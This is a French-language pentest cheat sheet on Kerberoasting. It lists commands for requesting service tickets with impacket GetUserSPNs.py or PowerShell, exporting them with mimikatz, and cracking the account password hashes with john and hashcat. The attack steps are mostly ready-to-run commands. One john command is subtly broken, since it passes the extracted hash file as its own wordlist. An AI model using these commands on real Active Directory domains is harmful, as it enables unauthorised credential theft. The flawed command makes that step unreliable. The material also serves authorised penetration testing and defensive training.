# Kerberoast

Un utilisateur de l’Active Directory peut demander un TGS pour n’importe quel service. Ainsi, un attaquant peut effectuer des demandes de TGS en indiquant des SPN arbitraires. S'ils existent, un ticket de service (TGS) sera obtenu. Celui-ci contiendra le mot de passe (sous forme de _hash_) du compte exécutant le service. L’attaquant peut, avec cette information, tenter de trouver le mot de passe en clair du compte via une attaque par brute force.

### Récupération des tickets TGS

#### Avec un compte sur le domaine

```
GetUserSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
```

Cette commande va recenser tous les comptes utilisateur (non machine) exécutant un service (attribut `ServicePrincipalName` non vide) pour émettre une demande de ticket TGS en leur nom. Ces tickets seront ensuite affichés.

Il n'est pas possible de réaliser de _Pass The Ticket_ avec les TGS.

#### Avec une machine sur le domaine

Il faut commencer par faire une demande de ticket avec un utilisateur _kerberoastable_ (visible dans `bloodhound` par exemple) __ :&#x20;

```
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN-USER>' # <SPN-USER> est visible dans le détail d'un utilisateur sur bloodhound.
```

Ensuite, il faut récupérer le ticket. Pour cela, `mimikatz` peut être utilisé :&#x20;

```
# privilege::debug
# kerberos::list /export
```

Grâce à la dernière commande `mimikatz`, il est possible de connaître le fichier contenant le ticket. Il ne reste qu'à casser le mot de passe contenu dans ce dernier :&#x20;

```
kirbi2john <FILE>.kirbi > <FILE>.txt
john --fork=4 --format=krb5tgs --wordlist=<FILE>.txt <FILE>.txt
```

### Cassage des _hashs_ obtenus

```
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
```

Plusieurs format de hash peuvent être obtenu :

* $17 : AES128
* $18 : AES256 (-m 19700 sur hashcat, pas pris en compte par john)
* $23 : RC4-HMAC-MD5 (pris en compte par john)
